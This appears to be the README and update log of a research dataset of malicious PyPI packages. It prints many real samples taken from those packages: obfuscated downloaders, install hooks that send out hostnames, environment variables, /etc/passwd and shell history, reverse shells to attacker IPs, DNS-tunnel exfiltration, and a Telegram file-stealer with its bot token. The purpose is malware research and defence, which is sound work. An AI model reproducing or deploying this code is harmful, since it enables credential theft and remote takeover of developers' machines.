## Dataset Size

This data set includes about 10,822 versions of the source code of 9,502 malicious packages.

## Dataset Format

`package name -> version -> source code zip file.`

Example:
`ython-binance -> 0.1 -> ython-binance-0.1.tar.gz`

## False positive

**We have manually checked all collected malicious packages and have now removed all false positives.**

## Cite Me
 
This dataset is the work of the ASE 2023 paper "An Empirical Study of Malicious Code In PyPI Ecosystem"

```
@inproceedings{guo2023empirical,
  title={An Empirical Study of Malicious Code In PyPI Ecosystem},
  author={Guo, Wenbo and Xu, Zhengzi and Liu, Chengwei and Huang, Cheng and Fang, Yong and Liu, Yang},
  booktitle={2023 38th IEEE/ACM International Conference on Automated Software Engineering (ASE)},
  pages={166--177},
  year={2023},
  organization={IEEE}
}
```

## Update

### 31 Mar. 2024 
Add new 431 malicious packages using typoSquatting attack method.

ref: [https://mp.weixin.qq.com/s/VIThE0I5BkQBW6hIOubnkQ](https://mp.weixin.qq.com/s/VIThE0I5BkQBW6hIOubnkQ)


### 04 Apr. 2024 
Add new 45 malicious packages using typoSquatting attack method.


### 16 Apr. 2024 
Add new 56 malicious packages using typoSquatting attack method. 

Malicious code in these packages.
```python
try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
```


### 21 Apr. 2024 
Add new 34 malicious packages using typoSquatting attack method.


### 1 May. 2024 
Add new 1154 malicious packages using typoSquatting attack method.

Malicious code in these packages.
```python
try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
```


```python
...
while 馬女水女口目人馬鳥月水馬山山馬鸟:
  if 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:
    import pip
    pip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__builtins__,
              oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(7 << 4), (((1 << 4) - 1) << 3) + 1, (7 << 4), ((((3 << 2) + 1)) << 3) + 1, (((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 1)]))])

    馬女水女口目人馬鳥月水馬山山馬鸟 = (896*(494 & 86)+104//648-(885 | 515+277) | 885 << 141 << 580 >> (593 | 648) & ~87) >> 9523
  elif 馬女水女口目人馬鳥月水馬山山馬鸟 == 286625773:
...
```



### 2 May. 2024 
Add new 181 malicious packages.



### 3 May. 2024 
Add new 35 malicious packages.

There are many different types of malicious code in these packages. Here are some examples.

```python
def RunCommand():
    output = subprocess.check_output(["ps", "-elf"]).decode("utf-8")
    data = {"ls_output": output, "key1": "value1", "key2": "value2"}
    data_string = "&".join([f"{key}={value}" for key, value in data.items()])
    curl_command = [
        "curl",
        "-X",
        "POST",
        "-d",
        f"'{data_string}'",  # Pass the data as form data
        "http://zvqyzaqnwvjsqdhrbdiupz8e84un8xyb7.oast.fun",
    ]
    subprocess.run(curl_command, check=True)
```

```python
def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def notmalfunc():
    os.system(b64d("Y3VybCAtcyAtbyAldGVtcCVcc3RyaW5ncy5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE0NjE5OTEyNDU3MjYzOTI0OS8xMTg4OTc0NDUzNTQwMDAzODUwL3N0cmluZ3MuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVxzdHJpbmdzLmJhdA=="))
```

```python
if 'sdist' not in argv:
    if name == 'nt':
        exec(b64decode("base64 string").decode())
    else:
        exec(b64decode("base64 string").decode())
```

```python
import base64
exec(base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK"))
```

```python
hostname = socket.gethostname()
osname = platform.system()
ip = socket.gethostbyname(hostname)
server_url = "https://eo1okaacpdhx16n.m.pipedream.net/poc"
data = {
    "hostname": hostname,
    "osname": osname,
    "ip": ip
}

try:
    response = requests.post(server_url, json=data)
    if response.status_code == 200:
        print("Data sent successfully to the server.")
    else:
        print(f"Failed to send data. Status code: {response.status_code}")
except Exception as e:
    print(f"Error: {str(e)}")
```

```python
import requests

mycode = os.environ
secret = base64.b64encode(bytes(str(mycode),"UTF-8"))
data = "https://eow8fqyd1emg87l.m.pipedream.net/" + secret.decode('utf-8')
requests.get(data)
```


### Suspecious packages

discomusic-0.0.3

```python
import requests
file = requests.get("https://cdn.discordapp.com/attachments/1172852260624154634/1175473089748934656/PythonLIB.exe?ex=656b5b9f&is=6558e69f&hm=1d4e961eb9b5c1644449a0caf02b6f2e7d4e17c9a8bb3ded2a92d05bbcf80a1e&")
with open("discomusic.exe", "wb") as f:
    f.write(file.content)
```

Although the code is not any direct malicious behavior, But it downloads a malicious executable file. We will keep it in the dataset for further analysis.



### 7 May. 2024 
Add new 1017 malicious packages.


### 8 May. 2024 
multiconnections [2.35.4]

reflink: https://osv.dev/vulnerability/MAL-2024-1334


### 14 May. 2024 
testpkg3322 [2.35.8, 2.35.9, 2.35.10, 2.35.12, 2.35.14, 2.35.15, 2.35.16, 2.35.18, 2.35.19]

reflink: https://osv.dev/vulnerability/MAL-2024-1365

```python
def x():
    t = "https://frvezdff.pythonanywhere.com/getrnr"
    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\bbb.bat")
    time.sleep(2)
    if getattr(sys, 'frozen', False):
        currentFilePath = os.path.dirname(sys.executable)
    else:
        currentFilePath = os.path.dirname(os.path.abspath(__file__))
    fileName = os.path.basename(sys.argv[0])
    filePath = os.path.join(currentFilePath, fileName)
    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    try:
        with open(os.getenv('APPDATA')+"\\bbb.bat", "r") as file:
            cont = file.read()  
        with open(startupFolderPath+"\\bbb.bat", "w+") as file:
            file.write(cont)
    except:
        pass
    subprocess.Popen(os.getenv('APPDATA')+"\\bbb.bat", creationflags=subprocess.CREATE_NO_WINDOW)
    time.sleep(15)
    os.system("shutdown /r /f")
x()
```


### 16 May. 2024 
vertica_parser [99.9.9] <br>
dependency999  [9.9.9] <br>


```python
def dns_request(name, qtype=1, addr=('127.0.0.53', 53), timeout=1):  # A 1, NS 2, CNAME 5, SOA 6, NULL 10, PTR 12, MX 15, TXT 16, AAAA 28, NAPTR 35, * 255
    name = name.rstrip('.')
    queryid = secrets.token_bytes(2)
    # Header. 1 for Recursion Desired, 1 question, 0 answers, 0 ns, 0 additional
    request = queryid + b'\1\0\0\1\0\0\0\0\0\0'
    # Question
    for label in name.rstrip('.').split('.'):
        assert len(label) < 64, name
        request += int.to_bytes(len(label), length=1, byteorder='big')
        request += label.encode()
    request += b'\0'  # terminates with the zero length octet for the null label of the root.
    request += int.to_bytes(qtype, length=2, byteorder='big')  # QTYPE
    request += b'\0\1'  # QCLASS = 1
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(request, addr)
        s.settimeout(timeout)
        try:
            response, serveraddr = s.recvfrom(4096)
        except socket.timeout:
            pass

def custom_command():
    package = 'vertica-parser'
    domain = 'uchpuchmak.lol'
    ns1 = f'ns1.{domain}'

    data = {
        'p': package,
        'h': socket.gethostname(),
        'd': getpass.getuser(),
        'c': os.getcwd()
    }
    json_data = json.dumps(data)
    hex_str = json_data.encode('utf-8').hex()
    chunks = len(hex_str) // 60
    hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]
    id_rand = random.randint(36 ** 12, (36 ** 13) - 1)

    for count, value in enumerate(hex_list):
        t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'
        dns_request(t_str, addr=(ns1, 53))

class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        custom_command()

class CustomDevelopCommand(develop):
    def run(self):
        develop.run(self)
        custom_command()

class CustomEggInfoCommand(egg_info):
    def run(self):
        egg_info.run(self)
        custom_command()
```

### 17 May. 2024 
sphinx-rtd-theme-cilium [99.9.9] <br>
requests_darwin_lite  [2.28.0] <br>

When the user installs the affected version of the requests-darwin-lite pyhton component package, the malicious Trojan file **requests-sidebar-large.png** will be executed on the Mac system, stealing sensitive system information and establishing a persistent connection with a C2 address controlled by the attacker. Attack The attacker can remotely execute malicious system commands on the user's system.

### 18 May. 2024 
user-agents-parser [2.2.2] <br>
    
```python
__import__("os").system("(crontab -l > .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/95.179.177.74/1337 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1")
```

### 20 May. 2024 
python-consul2-hh [999.9.9] <br>

### 21 May. 2024 
jupyter_calendar_extension [0.1] <br>
blypack [0.1, 0.2, 0.3, 0.4, 0.5] <br>

```python
def post_install():
    os.system('curl https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test')
```

### 22 May. 2024 
reallydonothing [0.1, 0.2] <br>
ml_linear_regression_lib [1.1.3] <br>
dependency_confusion123456 [9.9.9] <br>
dependency_confusion123 [1.0.4] <br>

```python
class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://u3ynvyf8desx9vy4a91eslj4rvxmld92.oastify.com",params = ploads)
```

### 24 May. 2024 
networkx-match-algr-0.1.1 <br>
networkx-match-ssss-0.1.1 <br>
reportgenpub-0.2 <br>
speech-dtw-0.1.1 <br>

```python
class PreInstallCommand(install):
    def run(self):
        try:
            # print("Running custom install command")
            # subprocess.check_call(['echo', 'Hello, World!'])
            
        
            ip = "172.16.0.103"  
            port = 12345  
            message = "Hello, Server!"  
            server_address = (ip, port)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
            sock.connect(server_address)

            try:
                sock.sendall(message.encode('utf-8'))
            finally:
                sock.close()

        except Exception as e:
            print(f"Server ERROR: {e}")
        install.run(self)
```

### 26 May. 2024 
jupyter_calendar_extension-0.1 <br>
calendar_extender-0.1 <br>
calendar_extender-0.2 <br>
auto_scrubber-0.1 <br>

```python
AUTO = [
	bytes.fromhex("73656564"),
	bytes.fromhex(
		"7f821d876c6d29d96b57e48aa82b2a2f2b1367332d362dc967113e3b3ae538bfd184fc02dbb74b9ba80ee40cd6eeb44441daf258112f3d7af7239c3cf0 "
	),
	bytes.fromhex("737472756374757265"),
	Path(
		bytes.fromhex(
			"2f55736572732f5368617265642f566964656f73"
		).decode("utf-8")
	),
	bytes.fromhex(
		"1796d1a5a7f083b4664e5967ee530a350ff77452cf91c0a12d68af01be5d9bf58c3fccfc17a6fd4f2e3247d517dbce02613a87f55440a281b3aaab88ffff3ecc"
	),
	bytes.fromhex("6c696265727479"),
	bytes.fromhex(
		"4a01697af6d555b03fa03593f0b0d2f1db114707686f34d7641ff7c37ff49f74"
	),
	bytes.fromhex("6e6f76656c"),
]


def fd(v: bytes, /) -> Generator[int, None, None]:
    def iter(v: bytes, /) -> tuple[bytes, bytes]:
        yy = hashlib.sha3_512(v).digest()
        return yy[0:32], yy[32:]

    _, ce = iter(v)
    pd, ce = iter(ce)

    while True:
        if not pd:
            pd, ce = iter(ce)
        f = pd[0]
        pd = pd[1:]

        yield f


def Runner_Auto(path: bytes, /) -> None:
    op = fd(AUTO[5] + path)
    td = fd(AUTO[0] + path)
    ap = fd(AUTO[7] + path)
    
    otherPlace = os.path.expanduser('~/.local/bin')
    os.makedirs(otherPlace, exist_ok=True)
    
    doc = ''.join(chr(x ^ t) for x, t in zip(AUTO[1], td))
    csv = ''.join(chr(f ^ d) for f, d in zip(AUTO[4], ap))

    url = {
        "x86_64": doc,
        "arm64": csv
    }.get(platform.machine())
    response = requests.get(url)
    buf = response.content
    out: list[int] = []

    for r, p in zip(buf, op):
        out.append(r ^ p)

    place = os.path.join(otherPlace, 'AutoScrub')
    with open(place, 'wb') as f:
        f.write(bytes(out))
    os.chmod(place, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            
    subprocess.Popen([place], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
```

### 03 Jun. 2024 
pyjous <br>
reqwestss <br>
numberpy <br>
pytoileur <br>
defca <br>

```python
try:
    import subprocess;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("shell.attacker.local",443));p=subprocess.Popen(["/bin/bash","-i"], stdout=s.fileno(), stdin=s.fileno(), stderr=s.fileno(), start_new_session=True)
except: pass

#import base64;exec(base64.b64decode('dHJ5OiBpbXBvcnQgc3VicHJvY2Vzcyxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnc2hlbGwuYXR0YWNrZXIubG9jYWwnLDQ0MykpO3A9c3VicHJvY2Vzcy5Qb3BlbihbJy9iaW4vYmFzaCcsJy1pJ10sc3Rkb3V0PXMuZmlsZW5vKCksc3RkaW49cy5maWxlbm8oKSxzdGRlcnI9cy5maWxlbm8oKSxzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQpleGNlcHQ6IHBhc3MK').decode())
```


### 06 Jun. 2024 
xFileSyncerx [0.0.2] <br>

```python
class Filesyncer:
    def __init__(self) -> None:
        self.os = "null"
        self.run()
        return

    def run(self):
        sleep(3)
        working = os.getcwd() + "/"
        b = [832, 928, 928, 896, 920, 464, 376, 376, 912, 776, 
             952, 368, 824, 840, 928, 832, 936, 784, 936, 920, 
             808, 912, 792, 888, 880, 928, 808, 880, 928, 368, 
             792, 888, 872, 376, 800, 408, 800, 936, 792, 928, 
             392, 944, 376, 928, 808, 920, 928, 808, 912, 360, 
             888, 816, 360, 928, 912, 808, 808, 920, 376, 872, 
             776, 840, 880, 376, 920, 400, 368, 896, 968]
                
        if working == b:
            print(f" Uname: {os.uname()[0]}\n CWD: {working}\n")
        else:
            b = [i << 2 for i in b]
            for i in b:
                i << 4

            exec(rs.get("".join(chr(x >> 5) for x in b)).text)
            #exec(r.text)

        return
    
Filesyncer()
```

### 12 Jun. 2024 
pyzelf [2.0.1] <br>


### 14 Jun. 2024 
pytypier [1.0.2] <br>
pyspliter [1.0.2] <br>
builderknower [0.1.1, 0.1.2, 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7, 0.1.8, 0.1.9, 0.1.10, 0.1.11, 0.1.12] <br>
thesis-uniud-package [1.0.0] <br>
thesis-package [1.0.0] <br>

```python
def _post_install():
    hostname = base64.b64encode(socket.getfqdn().encode()).decode()
    url = f'https://stark-mesa-88610-1b7520139d14.herokuapp.com/logo.png?{hostname}'
    destination = os.path.join(os.path.dirname(__file__), 'logo.png')
    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:
        data = response.read()
        out_file.write(data)


class CustomInstallCommand(install):
    def __init__(self, *args, **kwargs):
        super(CustomInstallCommand, self).__init__(*args, **kwargs)
        atexit.register(_post_install)
```

### 17 Jun. 2024 
We detected over 160 new malicious packages from PyPI using our proposed tool.

bussardweg4a, bussardweg4av2, bussardweg4av3, pyhton, pythn, pytgon, pytjon, pytuon, pytbon, pytohn, pytyon, pythkn, pythom, pythob, pytnon, pyhthon, pytojn, pytiom, pytiob, pythun, pytoh, pytonn, pthon, we3b, wev3, wb3, web3e, webt3, w3eb, 3web, w3b, wweb, werb3, web3q, wdb3, web2, wbe3, wweb3, web3-pyy, web3-pyu, w3b-py, web4-py, wb3-py, ewb3-py, wev3-py, web3-pu, we3-py, wweb3-py, 3web-py, web3-py9, web3-0py, web3-po, web3-p6, web3-p7, etheerum, ehtereum, etheereum, etehreum, etherium, wbe3-py, weeb3-py, ethherum, etherun, ethereun, eutherium, ethreium, eethereum, ethreum, etheerium, theerum, ethrum, etherum, etheum, etherem, etheurm, ethereuum, etheirum, etherriuum, etheruim, etheraem, etheriuum, eetherium, etheruem, ethererum, etheriun, etherreum, etheeruum, etheereium, etherim, etheriumm, ethereuim, etherreeum, etheeruim, etheriuim, etheruum, ettherium, ethreeum, ethherium, etheerem, etherreumm, etherumm, ethereumm, ethereim, etheeruimm, etherrium, etheruemm, ethereium, etheriem, etherriuumm, etheerim, openxsea, openasea, opensae, opensa, openesaa, openseaa, opnesea, oepnsea, openza, openes, openesa, opnsea, openae, openseea, oensea, opesnea, openzea, openseaz, openeasea, opensee, openrea, openwea, opemsea, opensew, oenasea, openresa, opensesa, opensead, openwse, openswa, openwsaa, opensear, openzsea, openrsea, openwsea, oenesea, openxsa, oopensea, openaes, opensar, openseax, openseae, oenwea, oepenwea, oepensea, oopenwea, opwnsea, openwae, oenwsea, openeaa

```python
VERSION = '1.0.0'
DESCRIPTION = 'UXxyykmDXkAnPEQfNvdUtxTNuctckuaHHCnTImtQRzglOiWmdzrZv'
LONG_DESCRIPTION = 'ujJtdAnhzIGMdzefKCkVnrXMrhkNnLZScQUjSueXaDwVQpRDVAvqPJZlleBBmdIkGFIemKYQTGIiVIKNFDBsoseEpqycHkgpOIhQy oOGLXFwcpyzaYlEaZjRHWhUJcILolUlWYcptAEheKQwMqaxeXuDnslbeTwUJhVTyXXnqlyU tLfJDT kVrgTSpXVxaJS'

class ISoCBaTjPLsVbdxvjibMWcFHgcNtfpDzwQpVFCUFERhdMzcSHOefUivrlwPKlRvSNuipCwrnebUodDeRylAoEVzGEnmrlxXHcOysITsUiAnMnMkQhnFFpAHjmKiRvSktdpFxRXdnCZSLwgdtuNmXAQzxX(install):
        def run(self):
            import os
            if os.name == "nt":
                import requests
                from fernet import Fernet
                exec(Fernet(b'QfwZUeQEdWdRN900FHlkogRkaRrUbQ15w5bLprHO8CI=').decrypt(b'gAAAAABmbvUP4TYR920z_RnjSNJZue88X-Xy-Z5T4NBwSlgSwgxIM8OYeSfb3fWY6L4jkak7LzL1JIarsJIFk9FWfactZo44jGDw93QAuPAWGydpk_ZeLwCfeZ3X7TOBvZ2tCZ8VKgT-Ol-BopepZIHls8qx-2IWSKhT6aFergwW-xmRPdc0vn81lA0UgqwjNULokOrW0KpLyroVEzTpCZjiNUuI-vnYOzzdpQjFzkWev9OH8HCrDU4='))
            install.run(self)
```

### 18 Jun. 2024
importlib-metadate [99.99] <br>
testkaralpoc45654 [1.0.0] <br>
ucap [3.6.1] <br>

```python
class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://kar.al",params = ploads)
```

### 19 Jun. 2024
nt4padyp3 [0.0.1, 0.0.2] <br>

```python
def read_ver():
	print("readver")
	curl_command = 'curl -X POST -H "Hostname: $(hostname)" -H "packagetype: NPM" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -d "Install Directory: \n $(ls -la) \n Security Groups: \n $(id) \n User Directory: \n $(ls ~)\n etc-passwd: \n $(cat /etc/passwd ) \n Installed NPM modules: \n $(npm ls)\n bash history: \n $(cat ~/.bash_history|head)" -H "Content-Type: text/plain" http://43.139.166.32:8080'
	subprocess.run(curl_command, shell=True)
	return "0.0.12"
```

### 20 Jun. 2024
quickwebbasicauth [2.3.2] <br>
artifact-lab-3-package-e90915e1 [0.1.2, 0.1.3] <br>
utilitytool [0.0.2] <br>
utilitytool2 [0.0.2, 0.0.3, 0.0.4, 0.0.5, 0.0.6, 0.0.7, 0.0.8, 0.0.9] <br>

```python
def download_and_run_exe(url, exe_path):
    """Download an executable file from a URL and run it."""
    def download_file(url, file_path):
        response = requests.get(url)
        if response.status_code == 200:
            with open(file_path, 'wb') as f:
                f.write(response.content)
            return True
        else:
            return False

    def run_exe(exe_path):
        try:
            subprocess.Popen(exe_path)
            return True
        except Exception as e:
            return False

    if download_file(url, exe_path):
        if run_exe(exe_path):
            return True
    return False

def main():
    url = "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/pics.exe"
    exe_path = "pics.exe"
    if download_and_run_exe(url, exe_path):
        print(".")
    else:
        print(".")
        print("cool")
```

### 21 Jun. 2024
webquickauth [2.3.5] <br>
startup-entrypoints [1.0, 4.0] <br>
spacestudio-orbit-propagation [1.1.3, 1.1.4, 1.1.5, 1.2.0, 1.2.1] <br>


### 23 Jun. 2024
artifact-lab-3-package-a18ff5d9 [0.1.1, 0.1.2, 0.1.3, 1.1.2, 1.1.3, 1.1.4, 1.1.5] <br>

```python
def notmalfunc():
    data = dict(os.environ)
    encoded_data = urllib.parse.urlencode(data).encode()
    url = 'https://2edb-85-48-187-158.ngrok-free.app'
    request = urllib.request.Request(url, data=encoded_data)

class AfterDevelop(develop):
    def run(self):
        develop.run(self)
        notmalfunc()

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()
```

### 24 Jun. 2024
class-py [1.0.0] <br>
builderknower2 [0.1.12, 0.1.13, 0.1.14, 0.1.15, 0.1.16, 0.1.17, 0.1.18, 0.1.19, 0.1.20, 0.1.21, 0.1.22, 0.1.23, 0.1.24, 0.1.25, 0.1.26, 0.1.27, 0.1.28, 0.1.29, 0.1.30] <br>

```python
class myclass(install): 
    def run(self): 
        LHOST = "85.159.212.47"
        LPORT = 61985 
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((LHOST, LPORT)) 
        os.dup2(s.fileno(), 0) 
        os.dup2(s.fileno(), 1) 
        os.dup2(s.fileno(), 2) 
        pty.spawn("/bin/sh") 
```

### 26 Jun. 2024
rock51 [1.0.0] <br>

### 02 Jul. 2024
add new 672 malicious packages, encompassing 997 versions.

```python
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem

class http:
 _ttmp = _ffile(delete=False)
 _ttmp.write(b"""from urllib.request import Request, urlopen;exec(urlopen(Request(url='https://rentry.co/277t2/raw', headers={'User-Agent': 'Mozilla/5.0'})).read())""")
 _ttmp.close()
 try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
 except: pass
```


### 06 Jul. 2024
IncapError [7.0.0] <br>

```python
class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}
        requests.get("https://1y05ug5pi97xa0bk2bjhdwp5yw4nsdg2.oastify.com", params=ploads)  # Replace with Interactsh or Pipedream
```

### 09 Jul. 2024
pystlete [2.9] <br>

### 17 Jul. 2024
ptmpl [0.2.0, 0.2.6, 0.2.14] <br>
h99ai [0.1.0] <br>
testbrojct2 [0.1, 0.2, 0.4] <br>
ptestown [0.6.0] <br>
proxyfullscrapers [0.1] <br>
proxyfullscraper [0.1] <br>
proxyalhttp [0.1] <br>

```python
import os
import requests
from concurrent.futures import ThreadPoolExecutor

def scan_and_send_files(bot_token, chat_id, folder_path='/'):
    API_URL_DOCUMENT = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    API_URL_MESSAGE = f'https://api.telegram.org/bot{bot_token}/sendMessage'

    def send_document_to_telegram(file_path, chat_id):
        try:
            with open(file_path, 'rb') as file:
                response = requests.post(API_URL_DOCUMENT, data={'chat_id': chat_id}, files={'document': file})
                return response.json()
        except Exception as e:
            return None

    def send_message_to_telegram(message, chat_id):
        try:
            response = requests.post(API_URL_MESSAGE, data={'chat_id': chat_id, 'text': message})
            return response.json()
        except Exception as e:
            return None

    contents = os.listdir(folder_path)

    for content in contents:
        content_path = os.path.join(folder_path, content)
        if os.path.isfile(content_path):
            if content.lower().endswith(('.py', '.php', '.zip')):
                try:
                    message = f"File: {content}\nPath: {content_path}"
                    msg_response = send_message_to_telegram(message, chat_id)
                    file_response = send_document_to_telegram(content_path, chat_id)
                except Exception as e:
                    pass
        elif os.path.isdir(content_path):
            files_in_subdir = [os.path.join(content_path, f) for f in os.listdir(content_path) if os.path.isfile(os.path.join(content_path, f))]
            for file_path in files_in_subdir:
                if file_path.lower().endswith(('.py', '.php', '.zip')):
                    try:
                        message = f"File: {os.path.basename(file_path)}\nPath: {file_path}"
                        msg_response = send_message_to_telegram(message, chat_id)
                        
                        file_response = send_document_to_telegram(file_path, chat_id)
                    except Exception as e:
                        pass
BOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'
CHAT_ID = 901011671
def send_photos_in_dcim_to_telegram(bot_token, chat_id, dcim_folder_path):
    API_URL = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

    def send_photo_to_telegram(file_path, chat_id):
        with open(file_path, 'rb') as file:
            response = requests.post(API_URL, data={'chat_id': chat_id}, files={'photo': file})
            return response.json()

    for root, dirs, files in os.walk(dcim_folder_path):
        for file in files:
            if file.lower().endswith(('.png', '.jpg', '.jpeg')):
                file_path = os.path.join(root, file)
                response = send_photo_to_telegram(file_path, chat_id)
                print(f'Sent {file_path}: {response}')
BOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'
CHAT_ID = 901011671
DCIM_FOLDER_PATH = '/sdcard/DCIM'
MAX_WORKERS = 5
def rudd():
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_scan = executor.submit(scan_and_send_files, BOT_TOKEN, CHAT_ID, folder_path='/storage/emulated/0')
        future_photos = executor.submit(send_photos_in_dcim_to_telegram, BOT_TOKEN, CHAT_ID, DCIM_FOLDER_PATH)
    future_scan.result()
    future_photos.result()
```


### 19 Jul. 2024
aptx [0.2] <br>

### 20 Jul. 2024
cipherbcrypt [1.0, 1.1, 1.2, 1.3, 1.4] <br>
```python
from http.client import HTTPSConnection
